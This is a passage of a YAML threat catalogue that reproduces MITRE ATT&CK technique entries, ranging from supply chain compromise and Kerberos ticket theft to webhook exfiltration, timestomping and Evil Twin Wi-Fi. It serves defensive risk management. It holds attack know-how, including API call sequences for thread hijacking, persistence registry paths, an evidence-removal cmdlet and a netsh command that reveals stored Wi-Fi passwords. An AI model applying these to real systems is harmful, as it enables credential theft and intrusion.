      \ or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil\
      \ 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired\
      \ victim set or malicious software may be distributed to a broad set of consumers\
      \ but only move on to additional tactics on specific victims.(Citation: Symantec\
      \ Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five\
      \ SK 2011) Popular open source projects that are used as dependencies in many\
      \ applications may also be targeted as a means to add malicious code to users\
      \ of the dependency.(Citation: Trendmicro NPM Compromise)\nhttps://attack.mitre.org/techniques/T1195"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1190
    ref_id: T1190
    name: Exploit Public-Facing Application
    description: 'Adversaries may attempt to exploit a weakness in an Internet-facing
      host or system to initially access a network. The weakness in the system can
      be a software bug, a temporary glitch, or a misconfiguration.


      Exploited applications are often websites/web servers, but can also include
      databases (like SQL), standard services (like SMB or SSH), network device administration
      and management protocols (like SNMP and Smart Install), and any other system
      with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation:
      CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure
      Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169)
      Depending on the flaw being exploited this may also involve [Exploitation for
      Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation
      for Client Execution](https://attack.mitre.org/techniques/T1203).


      If an application is hosted on cloud-based infrastructure and/or is containerized,
      then exploiting it may lead to compromise of the underlying instance or container.
      This can allow an adversary a path to access the cloud or container APIs (e.g.,
      via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)),
      exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611),
      or take advantage of weak identity and access management policies.


      Adversaries may also exploit edge network infrastructure and related appliances,
      specifically targeting devices that do not support robust host-based defenses.(Citation:
      Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)


      For websites and databases, the OWASP top 10 and CWE top 25 highlight the most
      common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top
      25)

      https://attack.mitre.org/techniques/T1190'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558
    ref_id: T1558
    name: Steal or Forge Kerberos Tickets
    description: "Adversaries may attempt to subvert Kerberos authentication by stealing\
      \ or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003).\
      \ Kerberos is an authentication protocol widely used in modern Windows domain\
      \ environments. In Kerberos environments, referred to as \u201Crealms\u201D\
      , there are three basic participants: client, service, and Key Distribution\
      \ Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request\
      \ access to a service and through the exchange of Kerberos tickets, originating\
      \ from KDC, they are granted access after having successfully authenticated.\
      \ The KDC is responsible for both authentication and ticket granting.  Adversaries\
      \ may attempt to abuse Kerberos by stealing tickets or forging tickets to enable\
      \ unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility\
      \ can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft\
      \ Klist)\nhttps://attack.mitre.org/techniques/T1558"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555
    ref_id: T1555
    name: Credentials from Password Stores
    description: 'Adversaries may search for common password storage locations to
      obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored
      in several places on a system, depending on the operating system or application
      holding the credentials. There are also specific applications and services that
      store passwords to make them easier for users to manage and maintain, such as
      password managers and cloud secrets vaults. Once credentials are obtained, they
      can be used to perform lateral movement and access restricted information.

      https://attack.mitre.org/techniques/T1555'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567
    ref_id: T1567
    name: Exfiltration Over Web Service
    description: 'Adversaries may use an existing, legitimate external Web service
      to exfiltrate data rather than their primary command and control channel. Popular
      Web services acting as an exfiltration mechanism may give a significant amount
      of cover due to the likelihood that hosts within a network are already communicating
      with them prior to compromise. Firewall rules may also already exist to permit
      traffic to these services.


      Web service providers also commonly use SSL/TLS encryption, giving adversaries
      an added level of protection.

      https://attack.mitre.org/techniques/T1567'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1219
    ref_id: T1219
    name: Remote Access Software
    description: "An adversary may use legitimate desktop support and remote access\
      \ software to establish an interactive command and control channel to target\
      \ systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`,\
      \ `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and\
      \ management (RMM) tools, are commonly used as legitimate technical support\
      \ software and may be allowed by application control within a target environment.(Citation:\
      \ Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation:\
      \ CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise\
      \ as an alternate communications channel for redundant access or as a way to\
      \ establish an interactive remote desktop session with the target system. They\
      \ may also be used as a component of malware to establish a reverse connection\
      \ or back-connect to a service or adversary-controlled system.\n \nAdversaries\
      \ may similarly abuse response features included in EDR and other defensive\
      \ tools that enable remote access.\n\nInstallation of many remote access software\
      \ may also include persistence (e.g., the software's installation routine creates\
      \ a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote\
      \ access modules/features may also exist as part of otherwise existing software\
      \ (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote\
      \ Desktop)(Citation: Chrome Remote Desktop)\nhttps://attack.mitre.org/techniques/T1219"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.001
    ref_id: T1583.001
    name: Domains
    description: "Adversaries may acquire domains that can be used during targeting.\
      \ Domain names are the human readable names used to represent one or more IP\
      \ addresses. They can be purchased or, in some cases, acquired for free.\n\n\
      Adversaries may use acquired domains for a variety of purposes, including for\
      \ [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189),\
      \ and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose\
      \ domains that are similar to legitimate domains, including through use of homoglyphs\
      \ or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation:\
      \ PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by\
      \ Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also\
      \ use internationalized domain names (IDNs) and different character sets (e.g.\
      \ Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually\
      \ similar lookalike domains used to deliver malware to victim machines.(Citation:\
      \ CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation:\
      \ httrack_unhcr)(Citation: lazgroup_idn_phishing)\n\nDifferent URIs/URLs may\
      \ also be dynamically generated to uniquely serve malicious content to victims\
      \ (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation:\
      \ URI)(Citation: URI Use)(Citation: URI Unique)\n\nAdversaries may also acquire\
      \ and repurpose expired domains, which may be potentially already allowlisted/trusted\
      \ by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation:\
      \ Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)\n\
      \nDomain registrars each maintain a publicly viewable database that displays\
      \ contact information for every registered domain. Private WHOIS services display\
      \ alternative information, such as their own company data, rather than the owner\
      \ of the domain. Adversaries may use such private WHOIS services to obscure\
      \ information about who owns a purchased domain. Adversaries may further interrupt\
      \ efforts to track their infrastructure by using varied registration information\
      \ and purchasing domains with different domain registrars.(Citation: Mandiant\
      \ APT1)\n\nIn addition to legitimately purchasing a domain, an adversary may\
      \ register a new domain in a compromised environment. For example, in AWS environments,\
      \ adversaries may leverage the Route53 domain service to register a domain and\
      \ create hosted zones pointing to resources of the threat actor\u2019s choosing.(Citation:\
      \ Invictus IR DangerDev 2024)\nhttps://attack.mitre.org/techniques/T1583/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.002
    ref_id: T1560.002
    name: Archive via Library
    description: 'An adversary may compress or encrypt data that is collected prior
      to exfiltration using 3rd party libraries. Many libraries exist that can archive
      data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile
      (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github).
      Most libraries include functionality to encrypt and/or compress data.


      Some archival libraries are preinstalled on systems, such as bzip2 on macOS
      and Linux, and zip on Windows. Note that the libraries are different from the
      utilities. The libraries can be linked against when compiling, while the utilities
      require spawning a subshell, or a similar execution mechanism.

      https://attack.mitre.org/techniques/T1560/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.003
    ref_id: T1055.003
    name: Thread Execution Hijacking
    description: "Adversaries may inject malicious code into hijacked processes in\
      \ order to evade process-based defenses as well as possibly elevate privileges.\
      \ Thread Execution Hijacking is a method of executing arbitrary code in the\
      \ address space of a separate live process. \n\nThread Execution Hijacking is\
      \ commonly performed by suspending an existing process then unmapping/hollowing\
      \ its memory, which can then be replaced with malicious code or the path to\
      \ a DLL. A handle to an existing victim process is first created with native\
      \ Windows API calls such as <code>OpenThread</code>. At this point the process\
      \ can be suspended then written to, realigned to the injected code, and resumed\
      \ via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>,\
      \ <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation:\
      \ Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012)\
      \ but targets an existing process rather than creating a process in a suspended\
      \ state.  \n\nRunning code in the context of another process may allow access\
      \ to the process's memory, system/network resources, and possibly elevated privileges.\
      \ Execution via Thread Execution Hijacking may also evade detection from security\
      \ products since the execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036
    ref_id: T1036
    name: Masquerading
    description: 'Adversaries may attempt to manipulate features of their artifacts
      to make them appear legitimate or benign to users and/or security tools. Masquerading
      occurs when the name or location of an object, legitimate or malicious, is manipulated
      or abused for the sake of evading defenses and observation. This may include
      manipulating file metadata, tricking users into misidentifying the file type,
      and giving legitimate task or service names.


      Renaming abusable system utilities to evade security monitoring is also a form
      of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS
      Main Site)

      https://attack.mitre.org/techniques/T1036'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.011
    ref_id: T1546.011
    name: Application Shimming
    description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by application shims. The Microsoft\
      \ Windows Application Compatibility Infrastructure/Framework (Application Shim)\
      \ was created to allow for backward compatibility of software as the operating\
      \ system codebase changes over time. For example, the application shimming feature\
      \ allows developers to apply fixes to applications (without rewriting code)\
      \ that were created for Windows XP so that it will work with Windows 10. (Citation:\
      \ Elastic Process Injection July 2017)\n\nWithin the framework, shims are created\
      \ to act as a buffer between the program (or more specifically, the Import Address\
      \ Table) and the Windows OS. When a program is executed, the shim cache is referenced\
      \ to determine if the program requires the use of the shim database (.sdb).\
      \ If so, the shim database uses hooking to redirect the code as necessary in\
      \ order to communicate with the OS. \n\nA list of all shims currently installed\
      \ by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\\
      AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows\
      \ nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases\
      \ are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\\
      AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\\
      currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows\
      \ designed them to run in user mode so they cannot modify the kernel and you\
      \ must have administrator privileges to install a shim. However, certain shims\
      \ can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)\
      \ (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data\
      \ Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),\
      \ and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims\
      \ may allow an adversary to perform several malicious acts such as elevate privileges,\
      \ install backdoors, disable defenses like Windows Defender, etc. (Citation:\
      \ FireEye Application Shimming) Shims can also be abused to establish persistence\
      \ by continuously being invoked by affected programs.\nhttps://attack.mitre.org/techniques/T1546/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552
    ref_id: T1552
    name: Unsecured Credentials
    description: 'Adversaries may search compromised systems to find and obtain insecurely
      stored credentials. These credentials can be stored and/or misplaced in many
      locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)),
      operating system or application-specific repositories (e.g. [Credentials in
      Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized
      files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation:
      Brining MimiKatz to Unix)

      https://attack.mitre.org/techniques/T1552'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.010
    ref_id: T1547.010
    name: Port Monitors
    description: "Adversaries may use port monitors to run an adversary supplied DLL\
      \ during system boot for persistence or privilege escalation. A port monitor\
      \ can be set through the <code>AddMonitor</code> API call to set a DLL to be\
      \ loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\\
      Windows\\System32</code> and will be loaded and run by the print spooler service,\
      \ `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham)\
      \ \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing\
      \ a fully-qualified pathname for that DLL to the `Driver` value of an existing\
      \ or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\\
      Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\
      \n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\nhttps://attack.mitre.org/techniques/T1547/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.008
    ref_id: T1070.008
    name: Clear Mailbox Data
    description: "Adversaries may modify mail and mail application data to remove\
      \ evidence of their activity. Email applications allow users and other programs\
      \ to export and delete mailbox data via command line tools or use of APIs. Mail\
      \ application data can be emails, email metadata, or logs generated by the application\
      \ or operating system, such as export requests. \n\nAdversaries may manipulate\
      \ emails and mailbox data to remove logs, artifacts, and metadata, such as evidence\
      \ of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534),\
      \ [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003)\
      \ for command and control, or email-based exfiltration such as [Exfiltration\
      \ Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For\
      \ example, to remove evidence on Exchange servers adversaries have used the\
      \ <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ module, including <code>Remove-MailboxExportRequest</code> to remove evidence\
      \ of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell\
      \ Module) On Linux and macOS, adversaries may also delete emails through a command\
      \ line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation:\
      \ mailx man page)\n\nAdversaries may also remove emails and metadata/headers\
      \ indicative of spam or suspicious activity (for example, through the use of\
      \ organization-wide transport rules) to reduce the likelihood of malicious emails\
      \ being detected by security products.(Citation: Microsoft OAuth Spam 2022)\n\
      https://attack.mitre.org/techniques/T1070/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.002
    ref_id: T1037.002
    name: Login Hook
    description: "Adversaries may use a Login Hook to establish persistence executed\
      \ upon user logon. A login hook is a plist file that points to a specific script\
      \ to execute with root privileges upon user logon. The plist file is located\
      \ in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file\
      \ and can be modified using the <code>defaults</code> command-line utility.\
      \ This behavior is the same for logout hooks where a script can be executed\
      \ upon user logout. All hooks require administrator permissions to modify or\
      \ create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts\
      \ Apple Dev) \n\nAdversaries can add or insert a path to a malicious script\
      \ in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code>\
      \ or <code>LogoutHook</code> key-value pair. The malicious script is executed\
      \ upon the next user login. If a login hook already exists, adversaries can\
      \ add additional commands to an existing login hook. There can be only one login\
      \ and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation:\
      \ Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11\
      \ version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
      \ and [Launch Agent](https://attack.mitre.org/techniques/T1543/001)\nhttps://attack.mitre.org/techniques/T1037/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1659
    ref_id: T1659
    name: Content Injection
    description: 'Adversaries may gain access and continuously communicate with victims
      by injecting malicious content into systems through online network traffic.
      Rather than luring victims to malicious payloads hosted on a compromised website
      (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed
      by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries
      may initially access victims through compromised data-transfer channels where
      they can manipulate traffic and/or inject their own content. These compromised
      online network channels may also be used to deliver additional payloads (i.e.,
      [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other
      data to already compromised systems.(Citation: ESET MoustachedBouncer)


      Adversaries may inject content to victim systems in various ways, including:


      * From the middle, where the adversary is in-between legitimate online client-server
      communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557),
      which describes AiTM activity solely within an enterprise environment) (Citation:
      Kaspersky Encyclopedia MiTM)

      * From the side, where malicious content is injected and races to the client
      as a fake response to requests of a legitimate online server (Citation: Kaspersky
      ManOnTheSide)


      Content injection is often the result of compromised upstream communication
      channels, for example at the level of an internet service provider (ISP) as
      is the case with "lawful interception."(Citation: Kaspersky ManOnTheSide)(Citation:
      ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)

      https://attack.mitre.org/techniques/T1659'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055
    ref_id: T1055
    name: Process Injection
    description: "Adversaries may inject code into processes in order to evade process-based\
      \ defenses as well as possibly elevate privileges. Process injection is a method\
      \ of executing arbitrary code in the address space of a separate live process.\
      \ Running code in the context of another process may allow access to the process's\
      \ memory, system/network resources, and possibly elevated privileges. Execution\
      \ via process injection may also evade detection from security products since\
      \ the execution is masked under a legitimate process. \n\nThere are many different\
      \ ways to inject code into a process, many of which abuse legitimate functionalities.\
      \ These implementations exist for every major OS but are typically platform\
      \ specific. \n\nMore sophisticated samples may perform multiple process injections\
      \ to segment modules and further evade detection, utilizing named pipes or other\
      \ inter-process communication (IPC) mechanisms as a communication channel.\n\
      https://attack.mitre.org/techniques/T1055"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.004
    ref_id: T1567.004
    name: Exfiltration Over Webhook
    description: "Adversaries may exfiltrate data to a webhook endpoint rather than\
      \ over their primary command and control channel. Webhooks are simple mechanisms\
      \ for allowing a server to push data over HTTP/S to a client without the need\
      \ for the client to continuously poll the server.(Citation: RedHat Webhooks)\
      \ Many public and commercial services, such as Discord, Slack, and `webhook.site`,\
      \ support the creation of webhook endpoints that can be used by other services,\
      \ such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When\
      \ changes happen in the linked services (such as pushing a repository update\
      \ or modifying a ticket), these services will automatically post the data to\
      \ the webhook endpoint for use by the consuming application. \n\nAdversaries\
      \ may link an adversary-owned environment to a victim-owned SaaS service to\
      \ achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020)\
      \ of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks\
      \ Repository Webhooks) Alternatively, instead of linking the webhook endpoint\
      \ to a service, an adversary can manually post staged data directly to the URL\
      \ in order to exfiltrate it.(Citation: Microsoft SQL Server)\n\nAccess to webhook\
      \ endpoints is often over HTTPS, which gives the adversary an additional level\
      \ of protection. Exfiltration leveraging webhooks can also blend in with normal\
      \ network traffic if the webhook endpoint points to a commonly used SaaS application\
      \ or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos\
      \ Discord Webhook Abuse)(Citation: Checkmarx Webhooks)\nhttps://attack.mitre.org/techniques/T1567/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205
    ref_id: T1205
    name: Traffic Signaling
    description: 'Adversaries may use traffic signaling to hide open ports or other
      malicious functionality used for persistence or command and control. Traffic
      signaling involves the use of a magic value or sequence that must be sent to
      a system to trigger a special response, such as opening a closed port or executing
      a malicious task. This may take the form of sending a series of packets with
      certain characteristics before a port will be opened that the adversary can
      use for command and control. Usually this series of packets consists of attempted
      connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)),
      but can involve unusual flags, specific strings, or other unique characteristics.
      After the sequence is completed, opening a port may be accomplished by the host-based
      firewall, but could also be implemented by custom software.


      Adversaries may also communicate with an already open port, but the service
      listening on that port will only respond to commands or trigger other malicious
      functionality if passed the appropriate magic value(s).


      The observation of the signal packets to trigger the communication can be conducted
      through different methods. One means, originally implemented by Cd00r (Citation:
      Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets
      in question. Another method leverages raw sockets, which enables the malware
      to use ports that are already open for use by other programs.


      On network devices, adversaries may use crafted packets to enable [Network Device
      Authentication](https://attack.mitre.org/techniques/T1556/004) for standard
      services offered by the device such as telnet.  Such signaling may also be used
      to open a closed service port such as telnet, or to trigger module modification
      of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries
      may use crafted packets to attempt to connect to one or more (open or closed)
      ports, but may also attempt to connect to a router interface, broadcast, and
      network address IP on the same port in order to achieve their goals and objectives.(Citation:
      Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco
      Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices,
      adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001)
      due to the monolithic nature of the architecture.


      Adversaries may also use the Wake-on-LAN feature to turn on powered off systems.
      Wake-on-LAN is a hardware feature that allows a powered down system to be powered
      on, or woken up, by sending a magic packet to it. Once the system is powered
      on, it may become a target for lateral movement.(Citation: Bleeping Computer
      - Ryuk WoL)(Citation: AMD Magic Packet)

      https://attack.mitre.org/techniques/T1205'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.008
    ref_id: T1021.008
    name: Direct Cloud VM Connections
    description: "Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log directly into accessible cloud hosted compute infrastructure through\
      \ cloud native methods. Many cloud providers offer interactive connections to\
      \ virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009),\
      \ such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance\
      \ Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in\
      \ the cloud), and AWS System Manager.(Citation: AWS System Manager).\n\nMethods\
      \ of authentication for these connections can include passwords, application\
      \ access tokens, or SSH keys. These cloud native methods may, by default, allow\
      \ for privileged access on the host with SYSTEM or root level access. \n\nAdversaries\
      \ may utilize these cloud native methods to directly access virtual infrastructure\
      \ and pivot through an environment.(Citation: SIM Swapping and Abuse of the\
      \ Microsoft Azure Serial Console) These connections typically provide direct\
      \ console access to the VM rather than the execution of scripts (i.e., [Cloud\
      \ Administration Command](https://attack.mitre.org/techniques/T1651)).\nhttps://attack.mitre.org/techniques/T1021/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218
    ref_id: T1218
    name: System Binary Proxy Execution
    description: 'Adversaries may bypass process and/or signature-based defenses by
      proxying execution of malicious content with signed, or otherwise trusted, binaries.
      Binaries used in this technique are often Microsoft-signed files, indicating
      that they have been either downloaded from Microsoft or are already native in
      the operating system.(Citation: LOLBAS Project) Binaries signed with trusted
      digital certificates can typically execute on Windows systems protected by digital
      signature validation. Several Microsoft signed binaries that are default on
      Windows installations can be used to proxy execution of other files or commands.


      Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code>
      to proxy execution of malicious commands.(Citation: split man page)(Citation:
      GTFO split)

      https://attack.mitre.org/techniques/T1218'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.006
    ref_id: T1070.006
    name: Timestomp
    description: "Adversaries may modify file time attributes to hide new files or\
      \ changes to existing files. Timestomping is a technique that modifies the timestamps\
      \ of a file (the modify, access, create, and change times), often to mimic files\
      \ that are in the same folder and blend malicious files with legitimate files.\n\
      \nBoth the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes\
      \ record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping\
      \ 2022) `$SI` (dates/time stamps) is displayed to the end user, including in\
      \ the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet\
      \ Forensics)\n\nModifying the `$SI` attribute is the most common method of timestomping\
      \ because it can be modified at the user level using API calls. `$FN` timestomping,\
      \ however, typically requires interacting with the system kernel or moving or\
      \ renaming a file.(Citation: Inversecos Timestomping 2022)\n\nAdversaries modify\
      \ timestamps on files so that they do not appear conspicuous to forensic investigators\
      \ or file analysis tools. In order to evade detections that rely on identifying\
      \ discrepancies between the `$SI` and `$FN` attributes, adversaries may also\
      \ engage in \u201Cdouble timestomping\u201D by modifying times on both attributes\
      \ simultaneously.(Citation: Double Timestomping)\n\nTimestomping may be used\
      \ along with file name [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)\n\
      https://attack.mitre.org/techniques/T1070/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.004
    ref_id: T1557.004
    name: Evil Twin
    description: "Adversaries may host seemingly genuine Wi-Fi access points to deceive\
      \ users into connecting to malicious networks as a way of supporting follow-on\
      \ behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040),\
      \ [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002),\
      \ or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia\
      \ \u2018Evil Twin\u2019)\n\nBy using a Service Set Identifier (SSID) of a legitimate\
      \ Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into\
      \ connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation:\
      \ medium evil twin)  Adversaries may provide a stronger signal strength or block\
      \ access to Wi-Fi access points to coerce or entice victim devices into connecting\
      \ to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple\
      \ \u2013 a network security auditing and penetration testing tool \u2013 may\
      \ be deployed in Evil Twin attacks for ease of use and broader range. Custom\
      \ certificates may be used in an attempt to intercept HTTPS traffic. \n\nSimilarly,\
      \ adversaries may also listen for client devices sending probe requests for\
      \ known or previously connected networks (Preferred Network Lists or PNLs).\
      \ When a malicious access point receives a probe request, adversaries can respond\
      \ with the same SSID to imitate the trusted, known network.(Citation: specter\
      \ ops evil twin)  Victim devices are led to believe the responding access point\
      \ is from their PNL and initiate a connection to the fraudulent network.\n\n\
      Upon logging into the malicious Wi-Fi access point, a user may be directed to\
      \ a fake login page or captive portal webpage to capture the victim\u2019s credentials.\
      \ Once a user is logged into the fraudulent Wi-Fi network, the adversary may\
      \ able to monitor network activity, manipulate data, or steal additional credentials.\
      \ Locations with high concentrations of public Wi-Fi access, such as airports,\
      \ coffee shops, or libraries, may be targets for adversaries to set up illegitimate\
      \ Wi-Fi access points.\nhttps://attack.mitre.org/techniques/T1557/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1620
    ref_id: T1620
    name: Reflective Code Loading
    description: "Adversaries may reflectively load code into a process in order to\
      \ conceal the execution of malicious payloads. Reflective loading involves allocating\
      \ then executing payloads directly within the memory of the process, vice creating\
      \ a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\
      \nReflectively loaded payloads may be compiled binaries, anonymous files (only\
      \ present in RAM), or just snubs of fileless executable code (ex: position-independent\
      \ shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation:\
      \ Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For\
      \ example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ may be abused to load raw code into the running process.(Citation: Microsoft\
      \ AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055)\
      \ except that the \u201Cinjection\u201D loads code into the processes\u2019\
      \ own memory instead of that of a separate process. Reflective loading may evade\
      \ process-based detections since the execution of the arbitrary code may be\
      \ masked within a legitimate or otherwise benign process. Reflectively loading\
      \ payloads directly into memory may also avoid creating files or other artifacts\
      \ on disk, while also enabling malware to keep these payloads encrypted (or\
      \ otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation:\
      \ 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)\n\
      https://attack.mitre.org/techniques/T1620"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1016.002
    ref_id: T1016.002
    name: Wi-Fi Discovery
    description: "Adversaries may search for information about Wi-Fi networks, such\
      \ as network names and passwords, on compromised systems. Adversaries may use\
      \ Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087),\
      \ [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and\
      \ other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006)\
      \ activity to support both ongoing and future campaigns.\n\nAdversaries may\
      \ collect various types of information about Wi-Fi networks from hosts. For\
      \ example, on Windows names and passwords of all Wi-Fi networks a device has\
      \ previously connected to may be available through `netsh wlan show profiles`\
      \ to enumerate Wi-Fi names and then `netsh wlan show profile \u201CWi-Fi name\u201D\
      \ key=clear` to show a Wi-Fi network\u2019s corresponding password.(Citation:\
